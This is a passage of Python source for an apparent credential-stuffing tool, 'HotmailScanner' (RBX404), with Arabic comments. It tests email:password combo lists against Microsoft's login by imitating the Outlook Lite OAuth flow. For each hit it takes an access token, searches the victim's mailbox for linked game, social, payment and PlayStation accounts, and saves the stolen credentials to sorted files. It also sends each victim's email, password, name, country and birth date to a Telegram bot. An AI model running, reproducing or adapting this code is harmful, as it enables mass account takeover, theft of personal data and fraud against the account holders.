                                    if 'EmailAddress' in sender:
                                        email_address = sender['EmailAddress']
                                        if 'Address' in email_address:
                                            address = email_address['Address']
                                            if domain.lower() in address.lower():
                                                emails.append(address)
            except:
                pass
            
            return {
                "found": domain_count > 0,
                "count": domain_count,
                "emails": list(set(emails))[:10]
            }
            
        except Exception as e:
            return {
                "found": False,
                "count": 0,
                "emails": []
            }

    @staticmethod
    def process_and_save(email, password, token, cid, mode, custom_domain=""):
        """معالجة النتائج وحفظها مع إضافة روابط التواصل الاجتماعي"""
        try:
            profile_info = HotmailScanner.get_extended_profile(token, cid)
            
            info_line = (f"𝗘𝗺𝗮𝗶𝗹: {email} | 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗗: {password} | "
                        f"𝗡𝗮𝗺𝗲: {profile_info['name']} | 𝗰𝗼𝘂𝗻𝘁𝗿𝗲: {profile_info['country']} | "
                        f"𝗕𝗶𝗿𝘁𝗗𝗮𝘁𝗲: {profile_info['birth_date']}")
            
            telegram_message = (f"🔥 <b>RBX404 - Account Found!</b>\n\n"
                              f"📧 <b>Email:</b> <code>{email}</code>\n"
                              f"🔑 <b>Password:</b> <code>{password}</code>\n"
                              f"👤 <b>Name:</b> {profile_info['name']}\n"
                              f"🌍 <b>Country:</b> {profile_info['country']}\n"
                              f"🎂 <b>Birth:</b> {profile_info['birth_date']}\n\n")
            
            found_services = []
            
            if mode == '1':  # General Scan
                found_services, email_content = HotmailScanner.general_scan(email, password, token, cid)
                
                if found_services:
                    services_str = "\n".join([f"✅ {s}" for s in found_services])
                    telegram_message += f"<b>🔗 Linked Services:</b>\n{services_str}\n\n"
                    
                    # محاولة استخراج روابط التواصل الاجتماعي
                    social_platforms = {
                        "TikTok": {"found": False, "username": None, "link": None},
                        "Instagram": {"found": False, "username": None, "link": None},
                        "Facebook": {"found": False, "username": None, "link": None},
                        "Twitter/X": {"found": False, "username": None, "link": None}
                    }
                    
                    # التحقق من وجود المنصات في الخدمات المكتشفة
                    for service in found_services:
                        if service in social_platforms:
                            social_platforms[service]["found"] = True
                    
                    # استخراج أسماء المستخدمين للمنصات الموجودة
                    for platform in social_platforms:
                        if social_platforms[platform]["found"]:
                            # محاولة استخراج اسم المستخدم من محتوى الإيميل
                            username = extract_username_from_content(email_content, platform)
                            if not username:
                                # إذا لم نجد، نستخدم اسم المستخدم من الإيميل
                                username = extract_username_from_email(email)
                            
                            if username:
                                social_platforms[platform]["username"] = username
                                social_platforms[platform]["link"] = create_profile_link(platform, username)
                                
                                # إضافة الرابط إلى رسالة التلجرام مع رابط قابل للنقر
                                telegram_message += f"🔗 <b>{platform}:</b> <a href='{social_platforms[platform]['link']}'>@{username}</a>\n\n"
                                
                                # حفظ الرابط في ملف منفصل
                                folder_map = {
                                    "TikTok": "TikTok_Links",
                                    "Instagram": "Instagram_Links",
                                    "Facebook": "Facebook_Links",
                                    "Twitter/X": "Twitter_Links"
                                }
                                folder = folder_map.get(platform, "Social")
                                link_data = f"{email}:{password} | @{username} | {social_platforms[platform]['link']}"
                                HotmailScanner.save_to_file(f"{platform}_Links_By_{MY_SIGNATURE}.txt", 
                                                           link_data, f"Results/{folder}", append_by=False)
                    
                    # حفظ الخدمات في المجلدات المناسبة
                    for service in found_services:
                        # تحديد المجلد المناسب لكل خدمة
                        if service in ['Steam', 'Xbox', 'PlayStation', 'Nintendo', 'Epic Games', 'EA Sports', 
                                       'Ubisoft', 'Activision', 'Blizzard', 'Riot Games', 'Roblox', 'Minecraft',
                                       'Fortnite', 'Valorant', 'League of Legends', 'Apex Legends', 'Call of Duty',
                                       'PUBG', 'Free Fire', 'Genshin Impact', 'Honkai Star Rail', 'Mobile Legends',
                                       'Clash of Clans', 'Clash Royale', 'Brawl Stars', 'Among Us', 'Fall Guys',
                                       'Rocket League', 'FIFA', 'Madden NFL', 'NBA 2K', 'GTA V', 'Red Dead',
                                       'The Sims', 'Battlefield', 'Overwatch', 'World of Warcraft', 'Hearthstone',
                                       'Diablo', 'Destiny', 'Halo', 'Counter-Strike', 'Dota 2', 'Rainbow Six',
                                       'Assassin\'s Creed', 'Far Cry', 'Watch Dogs', 'Warframe', 'Paladins', 'Smite',
                                       'Rogue Company', 'War Thunder', 'World of Tanks', 'Crossfire', 'Garena',
                                       'Cookie Run', 'Candy Crush', 'Pokémon GO', 'RAID Shadow', 'AFK Arena',
                                       'Supercell', 'Midasbuy']:
                            folder = "Games"
                        elif service in ['Skrill', 'Midasbuy']:
                            folder = "Payment"
                        elif service in ['OxyLabs', 'Flamingo Proxies', 'ProxyFreeOnly', 'LunaProxy']:
                            folder = "Proxy"
                        elif service in ['Facebook', 'Instagram', 'TikTok', 'Twitter/X', 'Snapchat', 'LinkedIn', 
                                        'Pinterest', 'Reddit', 'Discord', 'Telegram', 'WhatsApp']:
                            folder = "Social"
                        else:
                            folder = "Apps"
                        
                        service_filename = f"{service}_By_{MY_SIGNATURE}.txt"
                        HotmailScanner.save_to_file(service_filename, info_line, f"Results/{folder}", append_by=False)
                    
                    if 'PlayStation' in found_services:
                        psn_details = HotmailScanner.detailed_psn_scan(email, password, token, cid)
                        if psn_details['has_psn'] and psn_details['psn_emails_count'] > 0:
                            psn_info = (f"\n🎮 <b>PlayStation Network Found:</b>\n"
                                       f"   • PSN Emails: {psn_details['psn_emails_count']}\n"
                                       f"   • Orders: {psn_details['orders']}\n")
                            
                            if psn_details['online_ids']:
                                psn_info += f"   • Online ID: {', '.join(psn_details['online_ids'])}\n"
                            
                            telegram_message += psn_info
                            
                            psn_details_line = (f"{info_line}\n"
                                              f"Online ID: {', '.join(psn_details['online_ids']) if psn_details['online_ids'] else 'Not Found'}\n"
                                              f"Orders: {psn_details['orders']}")
                            HotmailScanner.save_to_file(f"PSN_Details_By_{MY_SIGNATURE}.txt", psn_details_line, "Results/PSN", append_by=False)
                
                HotmailScanner.save_to_file(f"General_Hits_By_{MY_SIGNATURE}.txt", info_line, "Results/General", append_by=False)
                
            elif mode == '2':  # Detailed PSN Scan
                psn_details = HotmailScanner.detailed_psn_scan(email, password, token, cid)
                
                if psn_details['has_psn'] and psn_details['psn_emails_count'] > 0:
                    found_services.append('PLAYSTATION')
                    
                    psn_msg = (f"🎮 <b>PlayStation Network Found!</b>\n"
                              f"   • PSN Emails: {psn_details['psn_emails_count']}\n"
                              f"   • Orders: {psn_details['orders']}\n")
                    
                    if psn_details['online_ids']:
                        psn_msg += f"   • Online ID: {', '.join(psn_details['online_ids'])}\n"
                    
                    telegram_message += psn_msg
                    
                    HotmailScanner.save_to_file(f"PSN_Hits_By_{MY_SIGNATURE}.txt", f"{email}:{password}", "Results/PSN", append_by=False)
                    
                    if psn_details['online_ids']:
                        for online_id in psn_details['online_ids']:
                            HotmailScanner.save_to_file(f"Online_IDs_By_{MY_SIGNATURE}.txt", f"{email}:{password} | {online_id}", "Results/PSN", append_by=False)
            
            elif mode == '3':  # Custom Domain Scan
                domain_results = HotmailScanner.custom_domain_scan(email, password, token, cid, custom_domain)
                
                if domain_results['found']:
                    found_services.append(custom_domain)
                    telegram_message += f"🔍 <b>Custom Domain Found:</b> {custom_domain}\n"
                    telegram_message += f"   • Count: {domain_results['count']}\n"
                    
                    if domain_results['emails']:
                        telegram_message += "   • Associated Emails:\n"
                        for em in domain_results['emails'][:5]:
                            telegram_message += f"      • {em}\n"
                    
                    safe_domain = custom_domain.replace('.', '_').replace('@', '_at_')
                    HotmailScanner.save_to_file(f"{safe_domain}_Hits_By_{MY_SIGNATURE}.txt", f"{info_line}\nDomain: {custom_domain}\nCount: {domain_results['count']}", "Results/Custom", append_by=False)
            
            # حفظ الهيت العام
            HotmailScanner.save_to_file(f"All_Hits_By_{MY_SIGNATURE}.txt", f"{email}:{password}", "Results", append_by=False)
            
            # إرسال إلى التلجرام فقط إذا في خدمات مرتبطة
            if found_services and len(found_services) > 0:
                telegram_message += f"\n⚡ <b>RBX404™</b>"
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{Tok}/sendMessage",
                        data={
                            "chat_id": id,
                            "text": telegram_message[:4000],
                            "parse_mode": "HTML",
                            "disable_web_page_preview": True
                        },
                        timeout=5
                    )
                    with print_lock:
                        print(f"{Fore.GREEN}   📤 Sent to Telegram ({len(found_services)} services){Style.RESET_ALL}")
                except Exception as e:
                    with print_lock:
                        print(f"{Fore.YELLOW}   ⚠ Telegram send failed: {e}{Style.RESET_ALL}")
            else:
                with print_lock:
                    print(f"{Fore.YELLOW}   ⏭ No linked services, skipping Telegram{Style.RESET_ALL}")
            
        except Exception as e:
            with print_lock:
                print(f"{Fore.YELLOW}[!] Error in processing {email}: {e}")

    @staticmethod
    def get_access_token(email, password, code, cid, mode, custom_domain=""):
        try:
            url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            token_res = requests.post(url, data=data).json()
            token = token_res.get("access_token")
            if token:
                threading.Thread(
                    target=HotmailScanner.process_and_save,
                    args=(email, password, token, cid, mode, custom_domain),
                    daemon=True
                ).start()
        except:
            pass

    @staticmethod
    def process(email, password, total_lines, mode, custom_domain=""):
        global good_count, bad_count, total_checked
        max_retries = 3
        retry_count = 0
        
        while retry_count < max_retries:
            try:
                headers_auth = {
                    "User-Agent": str(user_agent.generate_user_agent()),
                    "X-Requested-With": "com.microsoft.outlooklite",
                }
                params = {
                    "client_info": "1", "haschrome": "1", "login_hint": email, "mkt": "en",
                    "response_type": "code", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
                }
                url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
                
                res_auth = requests.get(url_auth, headers=headers_auth, timeout=10)
                cok = res_auth.cookies.get_dict()
                
                host = res_auth.text.split('"urlPost":"')[1].split('",')[0]
                ppft = res_auth.text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
                ad_url = res_auth.url.split('haschrome=1')[0]

                payload = {
                    "i13": "1", "login": email, "loginfmt": email, "type": "11",
                    "LoginOptions": "1", "passwd": password, "PPFT": ppft, "PPSX": "PassportR",
                    "i19": "9960"
                }
                headers_login = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": str(user_agent.generate_user_agent()),
                    "Referer": f"{ad_url}haschrome=1",
                    "Cookie": f"MSPRequ={cok.get('MSPRequ')};uaid={cok.get('uaid')}; RefreshTokenSso={cok.get('RefreshTokenSso')}; MSPOK={cok.get('MSPOK')}; OParams={cok.get('OParams')};"
                }
                
                res_login = requests.post(host, data=payload, headers=headers_login, allow_redirects=False, timeout=10)
                login_cookies = res_login.cookies.get_dict()
                
                with print_lock:
                    total_checked += 1
                    if any(key in login_cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]):
                        good_count += 1
                        mode_text = "GENERAL" if mode == '1' else "PSN DETAILED" if mode == '2' else f"CUSTOM ({custom_domain})"
                        print(f'{Fore.GREEN}[+] {total_checked}/{total_lines} - HIT ({mode_text}): {email}')
                        auth_code = res_login.headers.get('Location', '').split('code=')[1].split('&')[0]
                        cid = login_cookies.get('MSPCID', '').upper()
                        
                        threading.Thread(
                            target=HotmailScanner.get_access_token,
                            args=(email, password, auth_code, cid, mode, custom_domain),
                            daemon=True
                        ).start()
                    else:
                        bad_count += 1
                        print(f'{Fore.RED}[-] {total_checked}/{total_lines} - BAD : {email}')
                break
                
            except Exception as e:
                retry_count += 1
                if retry_count >= max_retries:
                    with print_lock:
                        print(f'{Fore.YELLOW}[!] Failed after {max_retries} retries: {email}')
                continue

# Execution
try:
    with open(file_path, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f if ':' in line]

    total = len(lines)
    mode_text = "GENERAL SCAN" if mode_choice == '1' else "PSN DETAILED SCAN" if mode_choice == '2' else f"CUSTOM DOMAIN ({custom_domain})"
    print(f"\n{Fore.CYAN}🚀 Engine Started | Mode: {mode_text} | Total: {total}")
    print(f"{Fore.WHITE}--------------------------------------------------")
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        for line in lines:
            if ':' in line:
                u, p = line.split(':', 1)
                future = executor.submit(HotmailScanner.process, u.strip(), p.strip(), total, mode_choice, custom_domain)
                futures.append(future)
        
        for future in futures:
            future.result()

except Exception as e:
    print(f"{Fore.RED}CRITICAL ERROR: {e}")
    import traceback
    traceback.print_exc()

print(f"\n{Fore.CYAN}✅ PROCESS COMPLETE")
print(f"{Fore.GREEN}✓ HITS: {good_count}")
print(f"{Fore.RED}✗ BAD: {bad_count}")
print(f"{Fore.YELLOW}📁 Results saved in:")
print(f"   • Results/PSN/ - For PSN detailed scans")
print(f"   • Results/General/ - For general scans")
print(f"   • Results/Games/ - For game services")
print(f"   • Results/Social/ - For social media")
print(f"   • Results/Apps/ - For apps and services")
print(f"   • Results/Payment/ - For payment services")
print(f"   • Results/Proxy/ - For proxy websites")
print(f"   • Results/TikTok_Links/ - TikTok profile links")
print(f"   • Results/Instagram_Links/ - Instagram profile links")
print(f"   • Results/Facebook_Links/ - Facebook profile links")
print(f"   • Results/Twitter_Links/ - Twitter profile links")
if mode_choice == '3':
    print(f"   • Results/Custom/ - For {custom_domain} scans")
print(f"\n{Fore.MAGENTA}📝 Note: All files saved with 'By {MY_SIGNATURE}' in filename")
